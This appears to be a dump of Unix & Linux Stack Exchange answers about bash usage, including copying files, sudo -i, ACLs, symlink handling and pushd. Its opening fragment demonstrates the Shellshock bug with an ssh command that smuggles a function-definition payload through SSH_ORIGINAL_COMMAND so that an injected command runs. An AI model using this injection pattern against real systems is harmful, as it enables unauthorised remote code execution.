<pre><code>$ ssh testuser@localhost '() { :;}; echo MALICIOUS CODE'
MALICIOUS CODE
starting sleep
</code></pre>

<p>This works because <code>sshd</code> sets the <code>SSH_ORIGINAL_COMMAND</code> environment variable to the command passed. So even though <code>sshd</code> ran <code>sleep</code>, and not the command I told it to, because of the exploit, my code still gets run.</p>
"
"Refresh env variables after editing bashrc file","26695","<bash><environment-variables><console>","68","<p>Within the same window, you can simply type <code>bash</code> to start a new one. This is equivalent to closing the window and re-opening a new one.</p>

<p>Alternatively, you can type <code>source ~/.bashrc</code> to source the <code>.bashrc</code> file.</p>
"
"Can I configure my shell to print STDERR and STDOUT in different colors?","12439","<bash><terminal><colors><stdout><stderr>","68","<p>This is a harder version of <a href=""https://unix.stackexchange.com/questions/9646/show-only-stderr-on-screen-but-write-both-stdout-and-stderr-to-file"">Show only stderr on screen but write both stdout and stderr to file</a>.</p>

<p>The applications running in the terminal use a single channel to communicate with it; the applications have two output ports, stdout and stderr, but they're both connected to the same channel.</p>

<p>You can connect one of them to a different channel, add color to that channel, and merge the two channels, but this will cause two problems:</p>

<ul>
<li>The merged output may not be exactly in the same order as if there had been no redirection. This is because the added processing on one of the channel takes (a little) time, so the colored channel may be delayed. If any buffering is done, the disorder will be worse.</li>
<li>Terminals use color changing escape sequences to determine the display color, e.g. <code>␛[31m</code> means “switch to red foreground”. This means that if some output destined to stdout arrives just as some output for stderr is being displayed, the output will be miscolored. (Even worse, if there's a channel switch in the middle of an escape sequence, you'll see garbage.)</li>
</ul>

<p>In principle, it would be possible to write a program that listens on two ptys¹, synchronously (i.e. won't accept input on one channel while it's processing output on the other channel), and immediately outputs to the terminal with appropriate color changing instructions. You'd lose the ability to run programs that interact with the terminal. I don't know of any implementation of this method.</p>

<p>Another possible approach would be to cause the program to output the proper color changing sequences, by hooking around all the libc functions that call the <code>write</code> system call in a library loaded with <a href=""http://www.kernel.org/doc/man-pages/online/pages/man8/ld-linux.so.8.html#ENVIRONMENT"" rel=""nofollow noreferrer""><code>LD_PRELOAD</code></a>. See <a href=""/a/26776"">sickill's answer</a> for an existing implementation, or <a href=""/a/53587"">Stéphane Chazelas's answer</a> for a mixed approach that leverages <code>strace</code>.</p>

<p>In practice, if that's applicable, I suggest redirecting stderr to stdout and piping into a pattern-based colorizer such as <a href=""http://joakimandersson.se/projects/colortail/"" rel=""nofollow noreferrer"">colortail</a> or <a href=""http://www.vanheusden.com/multitail/"" rel=""nofollow noreferrer"">multitail</a>, or special-purpose colorizers such as <a href=""http://www.console-colors.de/index.php?n=ConsColors.Downloads"" rel=""nofollow noreferrer"">colorgcc</a> or <a href=""http://bre.klaki.net/programs/colormake/"" rel=""nofollow noreferrer"">colormake</a>.</p>

<p>¹ <sub> pseudo-terminals. Pipes wouldn't work because of buffering: the source could write to the buffer, which would break the synchronicity with the colorizer. </sub></p>
"
"Shell Syntax: How to correctly use \ to break lines?","281309","<bash><shell-script>","68","<p>If the statement would be correct without continuation, you need to use <code>\</code>. Therefore, the following works without a backslash, as you can't end a command with a <code>&amp;&amp;</code>:</p>

<pre><code>echo 1 &amp;&amp;
echo 2
</code></pre>

<p>Here, you need the backslash:</p>

<pre><code>echo 1 2 3 \
4
</code></pre>

<p>or</p>

<pre><code>echo 1 \
&amp;&amp; echo 2
</code></pre>

<p>Otherwise, bash would execute the command right after processing the first line without waiting for the next one.</p>
"
"What does ""esac"" mean at the end of a bash case statement? Is it required?","256149","<bash><case>","68","<p>Like <code>fi</code> for <code>if</code> and <code>done</code> for <code>for</code>, <code>esac</code> is the required way to end a <code>case</code> statement.</p>

<p><code>esac</code> is <code>case</code> spelled backward, rather like <code>fi</code> is <code>if</code> spelled backward.  I don't know why the token ending a <code>for</code> block is not <code>rof</code>.</p>
"
"Appending a current date from a variable to a filename","57590","<bash><shell><rename><date>","68","<p>More than likely it is your use of <code>set</code>.  That will assign 'today', '=' and the output of the <code>date</code> program to positional parameters (aka command-line arguments).  You want to just use C shell (which you are tagging this as ""bash"", so likely not), you will want to use:</p>

<pre><code>today=`date +%Y-%m-%d.%H:%M:%S` # or whatever pattern you desire
</code></pre>

<p>Notice the lack of spaces around the equal sign.</p>

<p>You also do not want to use <code>&amp;</code> at the end of your statements; which causes the shell to not wait for the command to finish.  Especially when one relies on the next.  The <code>find</code> command could fail because it is started before the <code>mkdir</code>. </p>
"
"What do square brackets mean without the ""if"" on the left?","99185","<bash><shell>","67","<p>Square brackets are a shorthand notation for performing a conditional test. The brackets <code>[</code>, as well as <code>[[</code> are actual commands within Unix, believe it or not.</p>

<p>Think:</p>

<pre><code>$ [ -f /etc/rc.local ] &amp;&amp; echo ""real file""
real file

-and-

$ test -f /etc/rc.local &amp;&amp; echo ""real file""
real file
</code></pre>

<p>In Bash the <code>[</code> is a builtin command as well as an executable. <code>[[</code> is just a keyword to Bash.</p>

<h3>Example</h3>

<p>You can confirm this using <code>type</code>:</p>

<pre><code>$ type -a [
[ is a shell builtin
[ is /usr/bin/[

$ type -a [[
[[ is a shell keyword
</code></pre>

<p>You can see the physical executable here:</p>

<pre><code>$ ls -l /usr/bin/[
-rwxr-xr-x 1 root root 37000 Nov  3  2010 /usr/bin/[
</code></pre>

<h3>builtins vs. keywords</h3>

<p>If you take a look at the Bash man page, <code>man bash</code>, you'll find the following definitions for the 2:</p>

<ul>
<li><p><strong>keywords</strong> - Reserved words are words that have a special meaning to the shell.  The following words are recognized as reserved when unquoted and either the first word of a  simple  command  (see  SHELL GRAMMAR below) or the third word of a case or for command:</p>

<pre><code>! case  do done elif else esac fi for function if in select then until while { } time [[ ]]
</code></pre></li>
<li><p><strong>builtins</strong> - If the command name contains no slashes, the shell attempts to locate it.  If there exists a shell function by that name, that function is invoked as described above in FUNCTIONS.   If  the name does not match a function, the shell searches for it in the list of shell builtins.  If a match is found, that builtin is invoked.</p>

<p>If the name is neither a shell function nor a builtin, and contains no slashes, bash searches each element of the PATH for a directory containing an executable file by that name.  Bash uses a hash table to remember the full pathnames of executable files (see hash under SHELL BUILTIN COMMANDS below).  A full search of the directories in PATH is performed only if the command  is not found in the hash table.  If the search is unsuccessful, the shell searches for a defined shell function named command_not_found_handle.  If that function exists, it is invoked with the original command and the original command's arguments as its arguments, and the function's exit status becomes the exit status of the shell.  If that function  is  not  defined,  the  shell prints an error message and returns an exit status of 127.</p></li>
</ul>

<h3>man page</h3>

<p>If you look through the Bash man page you'll find the details on it.</p>

<pre><code>test expr
[ expr ]
          Return a status of 0 or 1 depending on the evaluation of the 
          conditional expression expr.  Each operator and operand must be
          a separate argument.  Expressions are composed of the  primaries 
          described  above  under  CONDITIONAL EXPRESSIONS.   test does not 
          accept any options, nor does it accept and ignore an argument of 
          -- as signifying the end of options.
</code></pre>

<p>Lastly from the man page:</p>

<pre><code>          test and [ evaluate conditional expressions using a set of rules
          based on the number of arguments.
</code></pre>

<h3>EDIT #1</h3>

<p>Follow-up question from the OP.</p>

<blockquote>
  <p>Ok, so why is there a need for an ""if"" then? I mean, why ""if"" even exists if ""["" would suffice.</p>
</blockquote>

<p>The <code>if</code> is part of a conditional. The <code>test</code> command or <code>[ ... ]</code> command simply evaluate the conditional, and return a 0 or a 1. The 0 or 1 is then acted on by the if statement. The 2 are working together when you use them.</p>

<h3>Example</h3>

<pre><code>if [ ... ]; then
   ... do this ...
else 
   ... do that ...
fi
</code></pre>
"
"Using OR patterns in shell wildcards","50220","<bash><shell><zsh><ls><wildcards>","67","<p>You don't even need extended globbing enabled to do what you want.  This will work in bash:</p>

<pre><code>ls {day*,night*}
</code></pre>
"
"How to copy files from the folder without the folder itself","180985","<bash><command-line><cp>","67","<p><strong>advanced cp</strong></p>

<pre><code>cp -r /home/username/A/. /usr/lib/B/
</code></pre>

<p>This is especially great because it works no matter whether the target directory already exists.</p>

<p><strong>shell globbing</strong></p>

<p>If there are not too many objects in the directory then you can use shell globbing:</p>

<pre><code>mkdir -p /usr/lib/B/
shopt -s dotglob
cp -r /home/username/A/* /usr/lib/B/
</code></pre>

<p><strong>rsync</strong></p>

<pre><code>rsync -a /home/username/A/ /usr/lib/B/
</code></pre>

<p>The <code>/</code> at the end of the source path is important; works no matter whether the target directory already exists.</p>

<p><strong>find</strong></p>

<pre><code>mkdir -p /usr/lib/B/
find /home/username/A/ -mindepth 1 -maxdepth 1 -exec cp -r -t /usr/lib/B/ {} +
</code></pre>

<p>or if you don't need empty subdirectories:</p>

<pre><code>find /home/username/A/ -mindepth 1 -type f -exec cp --parents -t /usr/lib/B/ {} +
</code></pre>

<p>(without <code>mkdir</code>)</p>
"
"sudo as another user with their environment","176997","<bash><sudo><environment-variables>","67","<p>To invoke a login shell using <code>sudo</code> just use <code>-i</code>. When command is not specified you'll get a login shell prompt, otherwise you'll get the output of your command.</p>

<p>Example (login shell):</p>

<pre><code>sudo -i
</code></pre>

<p>Example (with a specified user):</p>

<pre><code>sudo -i -u user
</code></pre>

<p>Example (with a command):</p>

<pre><code>sudo -i -u user whoami
</code></pre>

<p>Example (print user's <code>$HOME</code>):</p>

<pre><code>sudo -i -u user echo \$HOME
</code></pre>

<p>Note: The backslash character ensures that the dollar sign reaches the target user's shell and is not interpreted in the calling user's shell.</p>

<p>I have just checked the last example with <em>strace</em> which tells you exactly what's happening. The output bellow shows that the shell is being called with <code>--login</code> and with the specified command, just as in your explicit call to bash, but in addition <em>sudo</em> can do its own work like setting the <code>$HOME</code>.</p>

<pre><code># strace -f -e process sudo -S -i -u user echo \$HOME
execve(""/usr/bin/sudo"", [""sudo"", ""-S"", ""-i"", ""-u"", ""user"", ""echo"", ""$HOME""], [/* 42 vars */]) = 0
...
[pid 12270] execve(""/bin/bash"", [""-bash"", ""--login"", ""-c"", ""echo \\$HOME""], [/* 16 vars */]) = 0
...
</code></pre>

<p>I noticed that you are using <code>-S</code> and I don't think it is generally a good technique. If you want to run commands as a different user without performing authentication from the keyboard, you might want to use SSH instead. It works for <code>localhost</code> as well as for other hosts and provides public key authentication that works without any interactive input.</p>

<pre><code>ssh user@localhost echo \$HOME
</code></pre>

<p>Note: You don't need any special options with SSH as the SSH server always creates a login shell to be accessed by the SSH client.</p>
"
"How to pass the output of one command as the command-line argument to another?","4782","<bash><shell><command-line>","67","<p>You can use backticks (`) to evaluate a command and substitute in the command's output, like:</p>

<pre><code>echo ""Number of files in this directory: `ls | wc -l`""
</code></pre>

<p>In your case:</p>

<pre><code>wget `echo http://maps.google.be/maps?saddr\=$1\&amp;daddr\=$2 | sed 's/ /%/g'`
</code></pre>
"
"Splitting string by the first occurrence of a delimiter","53310","<bash><shell-script><string><split>","67","<p><code>cut</code> sounds like a suitable tool for this:</p>

<pre><code>bash-4.2$ s='id;some text here with possible ; inside'

bash-4.2$ id=""$( cut -d ';' -f 1 &lt;&lt;&lt; ""$s"" )""; echo ""$id""
id

bash-4.2$ string=""$( cut -d ';' -f 2- &lt;&lt;&lt; ""$s"" )""; echo ""$string""
some text here with possible ; inside
</code></pre>

<p>But <code>read</code> is even more suitable:</p>

<pre><code>bash-4.2$ IFS=';' read -r id string &lt;&lt;&lt; ""$s""

bash-4.2$ echo ""$id""
id

bash-4.2$ echo ""$string""
some text here with possible ; inside
</code></pre>
"
"Advantages of using set -o vi","30454","<bash><vim><vi>","66","<p>By setting your readline editing to either emacs (the default) or vi (<code>set -o vi</code>) you are essentially standardizing your editing commands, across the shell and your editor of choice<sup>1</sup>.</p>

<p>Thus, if you want to edit a command in the shell you use the same commands<sup>2</sup> that you would if you were in your text editor. This means only having to remember one command syntax and (if that were not advantage enough) would probably make your editing in both environments faster and less error prone...</p>

<p>You can further leverage this relationship in vi-mode by pulling up any command from your shell history, hitting <kbd>Escape</kbd> to enter command mode and then hitting <kbd>v</kbd>, which will open your $EDITOR with the command loaded for more complex editing with the full power of vim. Once you have finished editing the command to your satisfaction, <kbd>:wq</kbd> and the command is executed back in your shell.</p>

<p><br />
<sup>1. Assuming, of course, that you use Emacs or Vi/m as your editor.</sup><br />
<sup>2. Or, more accurately, a subset thereof...</sup></p>
"
"Difference between ""cd -"" and ""cd ~-""","330876","<bash><directory><cd-command><pushd>","66","<p>There are two things at play here. First, the <code>-</code> alone is expanded to your previous directory. This is explained in the <code>cd</code> section of <code>man bash</code> (emphasis mine):</p>

<blockquote>
  <p>An argument of <code>-</code> is converted to  $OLDPWD
                before  the directory change is attempted.  <strong>If a non-empty directory name from CDPATH is used, or if <code>-</code> is the first
  argument, and the directory change is successful, the absolute pathname of the new working directory is written to the 
  standard output.</strong>  The return value is true if the directory was successfully changed; false otherwise.</p>
</blockquote>

<p>So, a simple <code>cd -</code> will move you back to your previous directory and print the directory's name out. The other command is documented in the ""Tilde Expansion"" section:</p>

<blockquote>
  <p>If  the  tilde-prefix  is  a  <code>~+</code>, the value of the shell variable
  PWD replaces the tilde-prefix.  If the tilde-prefix is a <code>~-</code>, the
  value of the  shell variable OLDPWD, if it is set, is substituted. 
  If the characters following the tilde in the tilde-prefix consist
  of a  number  N,    optionally  prefixed  by  a  <code>+</code> or a <code>-</code>, the
  tilde-prefix is replaced    with the corresponding element from the
  directory stack, as it would be    displayed by the dirs builtin
  invoked with the tilde-prefix as an argument.  If the characters
  following the tilde in the  tilde-prefix  consist of a number
  without a leading <code>+</code> or <code>-</code>, <code>+</code> is assumed.</p>
</blockquote>

<p>This might be easier to understand with an example:</p>

<pre><code>$ pwd
/home/terdon
$ cd ~/foo
$ pwd
/home/terdon/foo
$ cd /etc
$ pwd
/etc
$ echo ~        ## prints $HOME
/home/terdon
$ echo ~+       ## prints $PWD
/etc
$ echo ~-       ## prints $OLDPWD
/home/terdon/foo
</code></pre>

<p>So, in general, the <code>-</code> means ""the previous directory"". That's why <code>cd -</code> by itself will move you back to wherever you were. </p>

<p>The main difference is that <code>cd -</code> is specific to the <code>cd</code> builtin. If you try to <code>echo -</code> it will just print a <code>-</code>. The <code>~-</code> is part of the tilde expansion functionality and behaves similarly to a variable. That's why you can <code>echo ~-</code> and get something meaningful. You can also use it in <code>cd ~-</code> but you could just as well use it in any other command. For example <code>cp ~-/* .</code> which would be equivalent to <code>cp ""$OLDPWD""/* .</code></p>
"
"Single command to login to SSH and run program?","119894","<bash><shell><ssh><openssh>","66","<p>Have you tried <code>ssh -t user@server ""mail &amp;&amp; bash""</code> (or replace <code>bash</code> with whatever shell you like)?</p>

<p>The <code>-t</code> is necessary in order to create a pseudo-tty for bash to use as an interactive shell.</p>
"
"How to copy some, but not all files?","41693","<bash><shell><wildcards>","65","<p>In <code>bash</code> you can use <code>extglob</code>:</p>

<pre><code> $ shopt -s extglob  # to enable extglob
 $ cp !(b*) new_dir/
</code></pre>

<p>where <code>!(b*)</code> exclude all <code>b*</code> files.</p>

<p>You can later disable <code>extglob</code> with</p>

<pre><code> $ shopt -u extglob
</code></pre>
"
"Run ./script.sh vs bash script.sh - permission denied","203371","<bash><shell-script><permissions><mount>","65","<h3>Incorrect POSIX permissions</h3>

<p>It means you don't have the execute permission bit set for <code>script.sh</code>. When running <code>bash script.sh</code>, you only need read permission for <code>script.sh</code>.  See <a href=""https://unix.stackexchange.com/questions/136547/what-is-the-difference-between-running-bash-script-sh-and-script-sh?rq=1"">What is the difference between running “bash script.sh” and “./script.sh”?</a> for more info.</p>

<p>You can verify this by running <code>ls -l script.sh</code>.</p>

<p>You may not even need to start a new Bash process. In many cases, you can simply run <code>source script.sh</code> or <code>. script.sh</code> to run the script commands in your current interactive shell. You would probably want to start a new Bash process if the script changes current directory or otherwise modifies the environment of the current process.</p>

<h3>Access Control Lists</h3>

<p>If the POSIX permission bits are set correctly, the Access Control List (ACL) may have been configured to prevent you or your group from executing the file.  E.g. the POSIX permissions would indicate that the test shell script is
executable.</p>

<pre><code>$ ls -l t.sh
-rwxrwxrwx+ 1 root root 22 May 14 15:30 t.sh
</code></pre>

<p>However, attempting to execute the file results in:</p>

<pre><code>$ ./t.sh
bash: ./t.sh: Permission denied
</code></pre>

<p>The <code>getfacl</code> command shows the reason why:</p>

<pre><code>$ getfacl t.sh
# file: t.sh
# owner: root
# group: root
user::rwx
group::r--
group:domain\040users:rw-
mask::rwx
other::rwx
</code></pre>

<p>In this case, my primary group is <code>domain users</code> which has had execute permissions revoked by restricting the ACL with <code>sudo setfacl -m 'g:domain\040users:rw-' t.sh</code>. This restriction can be lifted by either of the following commands:</p>

<pre><code>sudo setfacl -m 'g:domain\040users:rwx' t.sh
sudo setfacl -b t.sh
</code></pre>

<p>See:</p>

<ul>
<li><a href=""https://wiki.archlinux.org/index.php/Access_Control_Lists"" rel=""noreferrer"">Access Control Lists, Arch Linux Wiki</a></li>
<li><a href=""http://www.vanemery.com/Linux/ACL/linux-acl.html"" rel=""noreferrer"">Using ACLs with Fedora Core 2</a></li>
</ul>

<h3>Filesystem mounted with noexec option</h3>

<p>Finally, the reason in this specific case for not being able to run the script is that the filesystem the script resides on was mounted with the <code>noexec</code> option. This option overrides POSIX permissions to prevent any file on that filesystem from being executed.</p>

<p>This can be checked by running <code>mount</code> to list all mounted filesystems; the mount options are listed in parentheses in the entry corresponding to the filesystem, e.g.</p>

<pre><code>/dev/sda3 on /tmp type ext3 (rw,noexec)
</code></pre>

<p>You can either move the script to another mounted filesystem or remount the filesystem allowing execution:</p>

<pre><code>sudo mount -o remount,exec /dev/sda3 /tmp
</code></pre>

<p>Note: I’ve used <code>/tmp</code> as an example here since there are <a href=""https://serverfault.com/questions/72356/how-useful-is-mounting-tmp-noexec"">good security reasons</a> for keeping <code>/tmp</code> mounted with the <code>noexec,nodev,nosuid</code> set of options.</p>
"
"Symbolic link recursion - what makes it ""reset""?","79571","<bash><symlink>","65","<p>Patrice identified the source of the problem in <a href=""https://unix.stackexchange.com/a/79576/22565"">his answer</a>, but if you want to know how to get from there to why you get that, here's the long story.</p>
<p>The current working directory of a process is nothing you'd think too complicated. It is an attribute of the process which is a handle to a file of type directory where relative paths (in system calls made by the process) start from. When resolving a relative path, the kernel doesn't need to know the (a) full path to that current directory, it just reads the directory entries in that directory file to find the first component of the relative path (and <code>..</code> is like any other file in that regard) and continues from there.</p>
<p>Now, as a user, you sometimes like to know where that directory lies in the directory tree. With most Unices, the directory tree is a tree, with no loop. That is, there's only one path from the root of the tree (<code>/</code>) to any given file. That path is generally called the canonical path.</p>
<p>To get the path of the current working directory, what a process has to do is just walk up (well <em>down</em> if you like to see a tree with its root at the bottom) the tree back to the root, finding the names of the nodes on the way.</p>
<p>For instance, a process trying to find out that its current directory is <code>/a/b/c</code>, would open the <code>..</code> directory (relative path, so <code>..</code> is the entry in the current directory) and look for a file of type directory with the same inode number as <code>.</code>, find out that <code>c</code> matches, then opens <code>../..</code> and so on until it finds <code>/</code>. There's no ambiguity there.</p>
<p>That's what the <code>getwd()</code> or <code>getcwd()</code> C functions do or at least used to do.</p>
<p>On some systems like modern Linux, there's a system call to return the canonical path to the current directory which does that lookup in kernel space (and allows you to find your current directory even if you don't have read access to all its components), and that's what <code>getcwd()</code> calls there. On modern Linux, you can also find the path to the current directory via a readlink() on <code>/proc/self/cwd</code>.</p>
<p>That's what most languages and early shells do when returning the path to the current directory.</p>
<p>In your case, you can call <code>cd a</code> as may times as you want, because it's a symlink to <code>.</code>, the current directory doesn't change so all of <code>getcwd()</code>, <code>pwd -P</code>, <code>python -c 'import os; print os.getcwd()'</code>, <code>perl -MPOSIX -le 'print getcwd'</code> would return your <code>${HOME}</code>.</p>
<p>Now, symlinks went complicating all that.</p>
<p><code>symlinks</code> allow jumps in the directory tree. In <code>/a/b/c</code>, if <code>/a</code> or <code>/a/b</code> or <code>/a/b/c</code> is a symlink, then the canonical path of <code>/a/b/c</code> would be something completely different. In particular, the <code>..</code> entry in <code>/a/b/c</code> is not necessarily <code>/a/b</code>.</p>
<p>In the Bourne shell, if you do:</p>
<pre><code>cd /a/b/c
cd ..
</code></pre>
<p>Or even:</p>
<pre><code>cd /a/b/c/..
</code></pre>
<p>There's no guarantee you'll end up in <code>/a/b</code>.</p>
<p>Just like:</p>
<pre><code>vi /a/b/c/../d
</code></pre>
<p>is not necessarily the same as:</p>
<pre><code>vi /a/b/d
</code></pre>
<p><code>ksh</code> introduced a concept of a <em>logical current working directory</em> to somehow work around that. People got used to it and POSIX ended up specifying that behaviour which means most shells nowadays do it as well:</p>
<p>For the <code>cd</code> and <code>pwd</code> builtin commands (<strong>and only for them</strong> (though also for <code>popd</code>/<code>pushd</code> on shells that have them)), the shell maintains its own idea of the current working directory. It's stored in the <code>$PWD</code> special variable.</p>
<p>When you do:</p>
<pre><code>cd c/d
</code></pre>
<p>even if <code>c</code> or <code>c/d</code> are symlinks, while <code>$PWD</code> containes <code>/a/b</code>, it appends <code>c/d</code> to the end so <code>$PWD</code> becomes <code>/a/b/c/d</code>. And when you do:</p>
<pre><code>cd ../e
</code></pre>
<p>Instead of doing <code>chdir(&quot;../e&quot;)</code>, it does <code>chdir(&quot;/a/b/c/e&quot;)</code>.</p>
<p>And the <code>pwd</code> command only returns the content of the <code>$PWD</code> variable.</p>
<p>That's useful in interactive shells because <code>pwd</code> outputs a path to the current directory that gives information on how you got there and as long as you only use <code>..</code> in arguments to <code>cd</code> and not other commands, it's less likely to surprise you, because <code>cd a; cd ..</code> or <code>cd a/..</code> would generally get you back to where you were.</p>
<p>Now, <code>$PWD</code> is not modified unless you do a <code>cd</code>. Until the next time you call <code>cd</code> or <code>pwd</code>, a lot of things could happen, any of the components of <code>$PWD</code> could be renamed. The current directory never changes (it's always the same inode, though it could be deleted), but its path in the directory tree could change completely. <code>getcwd()</code> computes the current directory each time it's called by walking down the directory tree so its information is always accurate, but for the logical directory implemented by POSIX shells, the information in <code>$PWD</code> might become stale. So upon running <code>cd</code> or <code>pwd</code>, some shells may want to guard against that.</p>
<p>In that particular instance, you see different behaviours with different shells.</p>
<p>Some like <code>ksh93</code> ignore the problem completely, so will return incorrect information even after you call <code>cd</code> (and you wouldn't see the behaviour that you're seeing with <code>bash</code> there).</p>
<p>Some like <code>bash</code> or <code>zsh</code> do check that <code>$PWD</code> is still a path to the current directory upon <code>cd</code>, but not upon <code>pwd</code>.</p>
<p>pdksh does check upon both <code>pwd</code> and <code>cd</code> (but upon <code>pwd</code>, does not update <code>$PWD</code>)</p>
<p><code>ash</code> (at least the one found on Debian) does not check, and when you do <code>cd a</code>, it actually does <code>cd &quot;$PWD/a&quot;</code>, so if the current directory has changed and <code>$PWD</code> no longer points to the current directory, it will actually not change to the <code>a</code> directory in the current directory, but the one in <code>$PWD</code> (and return an error if it doesn't exist).</p>
<p>If you want to play with it, you can do:</p>
<pre><code>cd
mkdir -p a/b
cd a
pwd
mv ~/a ~/b 
pwd
echo &quot;$PWD&quot;
cd b
pwd; echo &quot;$PWD&quot;; pwd -P # (and notice the bug in ksh93)
</code></pre>
<p>in various shells.</p>
<p>In your case, since you're using <code>bash</code>, after a <code>cd a</code>, <code>bash</code> checks that <code>$PWD</code> still points to the current directory. To do that, it calls <code>stat()</code> on the value of <code>$PWD</code> to check its inode number and compare it with that of <code>.</code>.</p>
<p>But when the looking up of the <code>$PWD</code> path involves resolving too many symlinks, that <code>stat()</code> returns with an error, so the shell cannot check whether <code>$PWD</code> still corresponds to the current directory, so it computes it a again with <code>getcwd()</code> and updates <code>$PWD</code> accordingly.</p>
<p>Now, to clarify Patrice's answer, that check of number of symlinks encountered while looking up a path is to guard against symlink loops. The simplest loop can be made with</p>
<pre><code>rm -f a b
ln -s a b
ln -s b a
</code></pre>
<p>Without that safe guard, upon a <code>cd a/x</code>, the system would have to find where <code>a</code> links to, finds it's <code>b</code> and is a symlink which links to <code>a</code>, and that would go on indefinitely. The simplest way to guard against that is to give up after resolving more than an arbitrary number of symlinks.</p>
<p>Now back to the <em>logical current working directory</em> and why it's not so good a feature. It's important to realise that it's only for <code>cd</code> in the shell and not other commands.</p>
<p>For instance:</p>
<pre><code>cd -- &quot;$dir&quot; &amp;&amp;  vi -- &quot;$file&quot;
</code></pre>
<p>is not always the same as:</p>
<pre><code>vi -- &quot;$dir/$file&quot;
</code></pre>
<p>That's why you'll sometimes find that people recommend to always use <code>cd -P</code> in scripts to avoid confusion (you don't want your software to handle an argument of <code>../x</code> differently from other commands just because it's written in shell instead of another language).</p>
<p>The <code>-P</code> option is to disable the <em>logical directory</em> handling so <code>cd -P -- &quot;$var&quot;</code> actually does call <code>chdir()</code> on the content of <code>$var</code> (at least as long as <code>$CDPATH</code> it not set, and except when <code>$var</code> is <code>-</code> (or possibly <code>-2</code>, <code>+3</code>... in some shells) but that's another story). And after a <code>cd -P</code>, <code>$PWD</code> will contain a canonical path.</p>
"
"How to stop the loop bash script in terminal?","48425","<bash><signals><trap>","64","<p>The program <code>sl</code> purposely ignores <code>SIGINT</code>, which is what gets sent when you press <kbd>Ctrl+C</kbd>.  So, firstly, you'll need to tell <code>sl</code> not to ignore <code>SIGINT</code> by adding the <code>-e</code> argument.</p>

<p>If you try this, you'll notice that you can stop each individual <code>sl</code>, but they still repeat.  You need to tell <code>bash</code> to exit after <code>SIGINT</code> as well.  You can do this by putting a <code>trap ""exit"" INT</code> before the loop. </p>

<pre><code>#!/bin/bash
trap ""exit"" INT
while :
do
    sl -e
done
</code></pre>
"
"How to check if a pipe is empty and run a command on the data if it isn't?","33049","<bash><shell><pipe>","64","<p>There's no way to peek at the content of a pipe using commonly available shell utilities, nor is there a way to read a character from the pipe then put it back. The only way to know that a pipe has data is to read a byte, and then you have to get that byte to its destination.</p>

<p>So do just that: read one byte; if you detect an end of file, then do what you want to do when the input is empty; if you do read a byte then fork what you want to do when the input is not empty, pipe that byte into it, and pipe the rest of the data.</p>

<pre><code>first_byte=$(dd bs=1 count=1 2&gt;/dev/null | od -t o1 -A n | tr -dc 0-9)
if [ -z ""$first_byte"" ]; then
  # stuff to do if the input is empty
else
  {
    printf ""\\$first_byte""
    cat
  } | {
    # stuff to do if the input is not empty
  }      
fi
</code></pre>

<p>The <a href=""http://linux.die.net/man/1/ifne"" rel=""noreferrer""><code>ifne</code></a> utility from <a href=""https://joeyh.name/code/moreutils/"" rel=""noreferrer"">Joey Hess's moreutils</a> runs a command if its input is not empty. It usually isn't installed by default, but it should be available or easy to build on most unix variants. If the input is empty, <code>ifne</code> does nothing and returns the status 0, which cannot be distinguished from the command running successfully. If you want to do something if the input is empty, you need to arrange for the command not to return 0, which can be done by having the success case return a distinguishable error status:</p>

<pre><code>ifne sh -c 'do_stuff_with_input &amp;&amp; exit 255'
case $? in
  0) echo empty;;
  255) echo success;;
  *) echo failure;;
esac
</code></pre>

<p><code>test -t 0</code> has nothing to do with this; it tests whether standard input is a terminal. It doesn't say anything one way or the other as to whether any input is available.</p>
"
"What features are in zsh and missing from bash, or vice versa?","983","<bash><zsh>","63","<p>There's already been quite a bit of activity on the topic on other Stack Exchange sites. My experience of switching from bash to zsh, as far as can remember (it was years ago²), is that I didn't miss a single thing. I gained a lot; here are what I think are the simple zsh-specific features that I use most:</p>

<ul>
<li><p><sub>The zsh feature I most miss when I occasionally use bash is autocd: in zsh, executing a directory means changing to it, provided you turn on the <code>autocd</code> option.⁴</sub></p></li>
<li><p>Another very useful feature is the fancy globbing. The <strike>hieroglyphs</strike>characters are a bit hard to remember but extremely convenient (as in, it's often faster to look them up than to write the equivalent <code>find</code> command). A few of the simpler examples:<br>
    <code>foo*~*.bak</code> = all matches for <code>foo*</code> except those matching <code>*.bak</code><br>
    <code>foo*(.)</code> = only regular files matching <code>foo*</code><br>
    <code>foo*(/)</code> = only directories matching <code>foo*</code><br>
    <code>foo*(-@)</code> = only dangling symbolic links matching <code>foo*</code><br>
    <code>foo*(om[1,10])</code> = the 10 most recent files matching <code>foo*</code><br>
    <code>foo*(Lm+1)</code> = only files of size > 1MB<br>
<sub>    <code>dir/**/foo*</code> = <code>foo*</code> in the directory <code>dir</code> and all its subdirectories, recursively⁴</sub>  </p></li>
<li><p>For fancy renames, the <code>zmv</code> builtin can be handy. For example, to copy every <code><em>file</em></code> to <code><em>file</em>.bak</code>: <code>zmv -C '(*)(#q.)' '$1.bak'</code></p></li>
<li><p>Both bash and zsh have a decent completion system that needs to be turned on explicitly (<code>. /etc/bash_completion</code> or <code>autoload -U compinit; compinit</code>). Zsh's is much more configurable and generally fancier.</p></li>
</ul>

<p>If you run zsh without a <code>.zshrc</code>, it starts an interactive menu that lets you choose configuration options. (Some distributions may disable this; in that case, run <code>autoload zsh-newuser-install; zsh-newuser-install</code>.) I recommend enabling the recommended history options, turning on (“new-style”) completion, and turning on the “common shell options” except <code>beep</code>. Later, configure more options as you discover them.</p>

<p>²<sub>At the time programmable completion was zsh's killer feature, but bash acquired it soon after.</sub><br>
⁴<sub>Features that bash acquired only in version 4 (so are still not available on many systems) are in smaller type.</sub></p>
"
"Is there a way to cd back multiple times in bash?","84445","<bash><cd-command>","63","<p>In zsh, there's an <code>auto_pushd</code> option. This option makes <code>cd</code> behave like <code>pushd</code>. Then you can just use <code>popd</code> to go back to previous directories.</p>

<pre><code>~ $ setopt auto_pushd
~ $ cd /
/ $ cd /var
/var $ cd /usr
/usr $ dirs
/usr /var / ~
/usr $ popd
/var $ popd
/ $ popd
~ $
</code></pre>

<hr>

<p>In Bash, you can alias <code>cd</code> to <code>pushd</code>.</p>

<pre><code>alias cd=pushd
</code></pre>

<p>The one downside of this is that you will lose <code>cd</code>'s three flags. From the <code>cd</code> help entry:</p>

<blockquote>
  <p>-L      force symbolic links to be followed<br>
  -P      use the physical directory structure without following symbolic links<br>
  -e      if the -P option is supplied, and the current working directory
              cannot be determined successfully, exit with a non-zero status</p>
</blockquote>

<p>If you ever have to use the actual <code>cd</code> builtin instead of the alias, you can use one of these:</p>

<ul>
<li><code>'cd'</code> - Quoting the command makes the shell not resolve the alias and use the
normal cd.</li>
